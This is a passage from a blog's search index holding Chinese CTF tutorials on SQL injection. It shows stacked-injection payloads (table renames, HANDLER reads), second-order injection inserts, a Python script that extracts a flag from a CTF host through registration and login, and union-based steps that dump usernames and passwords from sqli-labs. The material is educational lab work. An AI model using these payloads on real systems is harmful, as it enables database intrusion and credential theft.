class="line">1&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span><br><span class="line"></span><br><span class="line">rename命令用于修改表名。</span><br><span class="line">rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><h6 id="利用-HANDLER-语句"><a href="#利用-HANDLER-语句" class="headerlink" title="利用 HANDLER 语句"></a>利用 HANDLER 语句</h6><p>如果rename、alter、select被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。</p><p><strong>打开表</strong>: 使用 <code>handler  open;</code> 打开指定表。</p><p><strong>读取数据</strong>: 使用 <code>handler  read ;</code> 读取指定行的数据。</p><p><strong>关闭表</strong>: 使用 <code>handler  close;</code> 关闭表</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br><span class="line">或</span><br><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#</span><br></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><blockquote><p>二次注入的成因：给大家放几张图</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222203505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222203612.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222204877.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205941.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205129.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205188.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222206110.png"></p><p><img src="C:/Users/Feces/AppData/Roaming/Typora/typora-user-images/image-20241022220643492.png" alt="image-20241022220643492"></p></blockquote><h5 id="二次注入用到的SQL语法知识"><a href="#二次注入用到的SQL语法知识" class="headerlink" title="二次注入用到的SQL语法知识"></a>二次注入用到的SQL语法知识</h5><p>通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个<strong>能显示插入数据的回显的地方</strong>（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>需要对后端的SQL语句有一个猜测</p><p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，<code>&#39;database()&#39;</code>会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了<code>&#39;0&#39;+database()+&#39;0&#39;</code>这样的构造，但是这个的回显是<code>0</code>，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的<code>&#39;0&#39;+hex(database())+&#39;0&#39;</code></p><h5 id="注入流程-5"><a href="#注入流程-5" class="headerlink" title="注入流程"></a>注入流程</h5><p>首先找到插入点，通常情况下是一个注册页面，<code>register.php</code>这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用<code>from for</code>语句来进行一个限制，可以编写脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re as r</span><br><span class="line">import time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+&#x27;-&#125;&#x27;+&#x27;&#123;&#x27;</span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = &#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">def register(email,username):</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    data = dict(email = email, username = username,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def login(email):</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    data = dict(email = email,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = &#x27;&#x27;</span><br><span class="line">for j in range(0,17):</span><br><span class="line">    payload = &quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;.format(int(j)*10+1,10)</span><br><span class="line">    email = &#x27;&#123;&#125;@qq.com&#x27;.format(str(j)+&#x27;14&#x27;)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    # print html.text</span><br><span class="line">    html = login(email)</span><br><span class="line">    try:</span><br><span class="line">        res = r.findall(r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;,html.text,r.S)</span><br><span class="line">        hex_flag += str(res[0]).strip()</span><br><span class="line">        print hex_flag</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    time.sleep(1)</span><br><span class="line">print hex_flag.decode(&#x27;hex&#x27;).decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure><hr><blockquote><p><em>基本的注入类型暂时告一段落了，下一篇，我会写出一些关于绕过的手法。</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之(一)</title>
      <link href="/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/"/>
      <url>/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQL注入——基本的注入方法-一"><a href="#SQL注入——基本的注入方法-一" class="headerlink" title="SQL注入——基本的注入方法(一)"></a>SQL注入——基本的注入方法(一)</h1><blockquote><p>最近几天学校刚好在学数据库，于是结合一下之前刷过的<strong>sql注入</strong>题做一个总结😎</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><a href="https://www.w3school.com.cn/sql/sql_syntax.asp">SQL语法</a> 具体不同的数据库还会有自己特有的一些语法结构或者函数等，这些都有可能成为我们注入的工具，但是我们很难成为开拓的人，我们只能去把它们积累起来，为我们以后的攻防作积累。</p><p>比较重要的基础，如增删改查，没学快去学！<a href="https://www.w3school.com.cn/sql/sql_syntax.asp">SQL语法</a></p><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入?"></a>什么是SQL注入?</h3><p><strong>SQL注入</strong>（SQL Injection）是一种常见的Web安全漏洞,常常因为web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句</p><p><strong>即：注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p><p>我们以sqli-labs第一关为例</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212015450.png"></p><p>用GET方法传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 //?表示查询参数</span><br></pre></td></tr></table></figure><p>说明我们查询成功了，结果如图所示</p><p>为了看清原理及其结果，我们打开源码查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>乍一看感觉好像没啥问题是嘛？</p><p>但是如果对于提交的参数<code>id</code>做出了刻意构造，构造出了恶意的参数，就会造成原有的sql语句发生变化，从而执行恶意代码，这就是sql注入的原理。</p><p>话不多说，让我们开始实践吧</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016597.png"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure><p>发现会有一句报错</p><p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p><p>但是为什么这样会报错呢，我们可以把参数带入原来的sql语句中可以发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>整个sql语句中多了一个单引号，因为多了一个单引号，新加的单引号会和前面的单引号成对(引号都是成对出现的),因此多出来的单引号就会报错</p><p>那么既然我们构造什么sql都会解析，能不能构造一些特别的语句呢?</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016071.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%23</span><br></pre></td></tr></table></figure><p>为什么这时候程序却不报错了？</p><blockquote><p>注:这里的%23就是注释符# 因为url会通过url编码将<code>#</code>解析为%23</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017591.png"></p></blockquote><p>再带入sql语句看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>在这里注释符<code>#</code>发挥了他应有的作用，在注释符后面的代码全部都被注释掉了，因此无法发挥原有的作用</p><p>于是sql语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#;&quot;</span><br></pre></td></tr></table></figure><p>故成功的构造出了带有目的性的代码</p><h3 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h3><h4 id="一-判断是否存在sqI注入与sqI注入的类型"><a href="#一-判断是否存在sqI注入与sqI注入的类型" class="headerlink" title="一.判断是否存在sqI注入与sqI注入的类型"></a>一.判断是否存在sqI注入与sqI注入的类型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先注入后,看是否有报错,是字符型还是数字型;然后再用order by爆字段(列)数,知道几个字段了,再输入相应字段的数,来看有几个显示位(回显)</span><br></pre></td></tr></table></figure><h4 id="二、判断sqI注入是字符型还是数字型"><a href="#二、判断sqI注入是字符型还是数字型" class="headerlink" title="二、判断sqI注入是字符型还是数字型"></a><strong>二、判断sqI注入是字符型还是数字型</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如说像id这个参数,我们输入id=1&#x27;报错了，说明是字符型注入,没有了话就是数字型注入</span><br></pre></td></tr></table></figure><h4 id="三、爆列数"><a href="#三、爆列数" class="headerlink" title="三、爆列数"></a><strong>三、爆列数</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先知道表格有几列:?id=1&#x27;order by 3 --+</span><br><span class="line">爆出显示位:?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">获取当前数据名和版本号:?id=-1&#x27;union select 1,database(),version()--+ //爆库名、看显位</span><br><span class="line">因为只有三列，所以这里 select 1,2,3只能有三个数</span><br></pre></td></tr></table></figure><p><code>order by 4</code>到4时候会报错，说明只有三列</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017456.png"></p><h4 id="四、然后数据库名"><a href="#四、然后数据库名" class="headerlink" title="四、然后数据库名"></a><strong>四、然后数据库名</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018797.png"></p><h4 id="五、爆表名"><a href="#五、爆表名" class="headerlink" title="五、爆表名"></a><strong>五、爆表名</strong></h4><p>爆表名了话我们就要知道一个东西,叫<code>information_schema</code></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018261.png" alt="image-20241021182541636"></p><p><code>information_schema</code> 在 MySQL 5.0 版本中引入，里面包括</p><table><thead><tr><th><strong>TABLES</strong></th><th>提供关于数据库中所有表的信息</th></tr></thead><tbody><tr><td><strong>COLUMNS</strong></td><td><strong>提供关于表的列信息</strong></td></tr><tr><td><strong>SCHEMATA</strong></td><td><strong>列出所有数据库（schema）的名称</strong></td></tr></tbody></table><p>等等</p><p>我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019360.png"></p><p>爆出了表名了，假如敏感信息在<code>users</code>表下，我们要进入<code>users</code>表获取其字段名</p><h4 id="六、爆字段名"><a href="#六、爆字段名" class="headerlink" title="六、爆字段名"></a><strong>六、爆字段名</strong></h4><p>只需要修改一点地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019842.png"></p><p><strong>通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。我自己加了一个id可以隔一下账户和密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212020794.png"></p><p>至此，一个简单的sql注入就完成了，但是实际中肯定没有这么简单，为了防范sql注入一些web应用会加上WAF(web application firewall)会对你传入的参数进行判断，是不是有害的，如果是则会拦截，因此学会绕过waf等才是我们的最终目的</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2024/10/08/hello-blog/"/>
      <url>/2024/10/08/hello-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Hello-This-is-my-first-article🦄"><a href="#Hello-This-is-my-first-article🦄" class="headerlink" title="Hello! This is my first article🦄"></a>Hello! This is my first article🦄</h1><p>欢迎来到我的第一篇博客！本博客是由Hexo框架，Butterfly魔改而成，参考博主<img src="https://www.fomal.cc/" alt="Fomalhaut">这篇文章将记录我对日常生活、学习、编程以及网络安全的一些心得和思考。希望通过写博客的方式，不仅能记录自己的成长历程，还能分享一些有价值的知识给大家。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 教程 </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
